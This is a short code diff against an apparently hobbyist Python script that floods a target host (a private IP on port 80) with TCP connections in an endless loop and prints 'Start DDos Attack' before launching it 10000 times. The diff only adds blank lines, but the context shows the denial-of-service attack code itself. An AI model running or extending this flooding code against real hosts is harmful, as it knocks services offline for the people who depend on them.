@@ -5,6 +5,7 @@ host = "192.168.178.150"
 ip = socket.gethostbyname(host)
 port = 80
 
+
 def dos():
     while True:
         mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,6 +18,7 @@ def dos():
             print()
             print("===== Cannot send the packet =====")
         mysocket.close()
+
 
 print("===== Start DDos Attack =====")
 for i in range(10000):
